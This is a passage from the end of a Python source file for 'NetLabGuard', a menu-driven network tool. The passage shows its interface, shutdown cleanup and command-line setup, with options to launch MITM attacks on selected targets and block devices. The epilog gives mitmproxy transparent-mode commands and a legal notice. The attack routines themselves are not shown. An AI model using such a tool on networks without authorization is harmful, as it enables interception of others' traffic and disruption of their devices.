                # Create menu table
                menu_table = Table(
                    title="🚀 NetLabGuard Main Operations",
                    box=box.DOUBLE,
                    header_style="bold cyan",
                    title_style="bold green",
                )

                menu_table.add_column("ID", style="yellow", justify="center", width=4)
                menu_table.add_column("Icon", style="green", justify="center", width=4)
                menu_table.add_column("Operation", style="cyan", width=20)
                menu_table.add_column("Description", style="white")

                for option_id, icon, operation, description in menu_options:
                    menu_table.add_row(option_id, icon, operation, description)

                self.console.print("\n")
                self.console.print(menu_table)

                # Status bar
                status_items = []
                if self.mitm_active:
                    status_items.append("[red]MITM ACTIVE[/]")
                if self.blocked_devices:
                    status_items.append(
                        f"[yellow]{len(self.blocked_devices)} BLOCKED[/]"
                    )
                if self.targets:
                    status_items.append(f"[green]{len(self.targets)} TARGETS[/]")

                if status_items:
                    status_text = " | ".join(status_items)
                    status_panel = Panel(
                        status_text,
                        border_style="yellow",
                        title="[bold yellow]⚡ STATUS[/]",
                    )
                    self.console.print(status_panel)

                choice = Prompt.ask(
                    "\n[bold white]Select operation (1-9)[/]",
                    choices=[str(i) for i in range(1, 10)],
                    default="1",
                )

                if choice == "1":
                    self.network_discovery()
                elif choice == "2":
                    target = self.select_target()
                    if target:
                        if target == "all":
                            self.console.print(
                                "[green]✓ Target selected: All network devices[/]"
                            )
                        else:
                            self.console.print(
                                f"[green]✓ Target selected: {target['ip']} ({target['vendor']})[/]"
                            )
                elif choice == "3":
                    target = self.select_target()
                    if target:
                        self.mitm_attack(target)
                elif choice == "4":
                    target = self.select_target()
                    if target and target != "all":
                        self.block_device(target)
                elif choice == "5":
                    self.unblock_device()
                elif choice == "6":
                    self.show_blocked_devices()
                elif choice == "7":
                    self.show_system_status()
                elif choice == "8":
                    self.show_logs()
                elif choice == "9":
                    self.shutdown_sequence()
                    break

            except KeyboardInterrupt:
                self.console.print(
                    "\n[yellow]🛑 Interrupted. Use option 9 to exit safely.[/]"
                )
                continue

    def shutdown_sequence(self):
        """Professional shutdown with cleanup"""
        shutdown_panel = Panel(
            "[yellow]Initiating shutdown sequence...[/]",
            border_style="yellow",
            title="[bold yellow]🔄 SHUTDOWN[/]",
        )
        self.console.print(shutdown_panel)

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console,
        ) as progress:
            # Stop MITM if active
            if self.mitm_active:
                task1 = progress.add_task("Stopping MITM operations...", total=None)
                self.stop_mitm_operation()
                time.sleep(1)
                progress.stop()

            # Unblock all devices
            if self.blocked_devices:
                task2 = progress.add_task("Unblocking all devices...", total=None)
                self.unblock_all_devices()
                time.sleep(1)
                progress.stop()

            # Final cleanup
            task3 = progress.add_task("Performing final cleanup...", total=None)
            self.cleanup_iptables_mitm()
            time.sleep(1)
            progress.stop()

        farewell_panel = Panel(
            f"[green]✓ NetLabGuard shutdown complete[/]\n"
            f"[cyan]Session log saved: {self.log_file}[/]\n"
            f"[yellow]Thank you for using NetLabGuard professionally[/]",
            border_style="green",
            title="[bold green]👋 FAREWELL[/]",
        )
        self.console.print(farewell_panel)
        self.logger.info("NetLabGuard shutdown completed")

    def run(self):
        """Main execution function"""
        self.display_banner()

        if not self.authorized:
            self.legal_authorization()

        self.check_root_privileges()
        self.detect_network_interface()

        welcome_panel = Panel(
            f"[green]✓ NetLabGuard initialized successfully[/]\n"
            f"[cyan]📝 Logging to: {self.log_file}[/]\n"
            f"[yellow]🔧 Ready for professional network operations[/]",
            border_style="green",
            title="[bold green]🚀 SYSTEM READY[/]",
        )
        self.console.print(welcome_panel)

        self.show_menu()


def main():
    """Entry point with enhanced command line support"""
    parser = argparse.ArgumentParser(
        description="NetLabGuard - Enterprise Network Security Auditing Platform",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Professional Examples:
  sudo python3 netlabguard.py              # Full interactive mode
  sudo python3 netlabguard.py --scan       # Quick network reconnaissance
  sudo python3 netlabguard.py --status     # System status check
  
LEGAL NOTICE: 
This platform requires proper authorization before use. Only use on networks 
you own or have explicit written permission to test. Unauthorized access is illegal.

TECHNICAL REQUIREMENTS:
- Linux operating system (required)
- Root privileges (required)  
- Python 3.6+ with scapy, rich, netifaces
- iptables for traffic manipulation
- mitmproxy (recommended for traffic visualization)

MITMPROXY INTEGRATION:
When running MITM operations, start mitmproxy in transparent mode:
  mitmproxy --mode transparent --showhost
  
Or use web interface:
  mitmweb --mode transparent --web-host 0.0.0.0
        """,
    )

    parser.add_argument(
        "--scan", action="store_true", help="Perform network discovery and exit"
    )

    parser.add_argument(
        "--status", action="store_true", help="Show system status and exit"
    )

    parser.add_argument(
        "--version", action="version", version="NetLabGuard Enterprise v2.0.0"
    )

    args = parser.parse_args()

    # Initialize NetLabGuard
    nlg = NetLabGuard()

    try:
        if args.scan:
            # Quick scan mode
            nlg.legal_authorization()
            nlg.check_root_privileges()
            nlg.detect_network_interface()
            nlg.network_discovery()
        elif args.status:
            # Status check mode
            nlg.check_root_privileges()
            nlg.detect_network_interface()
            nlg.show_system_status()
        else:
            # Full interactive mode
            nlg.run()
    except Exception as e:
        nlg.console.print(f"[red]❌ Critical error: {e}[/]")
        nlg.logger.error(f"Critical error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console = Console()
        console.print(f"\n[yellow]🛑 Program interrupted by user. Exiting safely...[/]")
        sys.exit(0)
    except Exception as e:
        console = Console()
        console.print(f"\n[red]❌ Fatal error: {e}[/]")
        sys.exit(1)
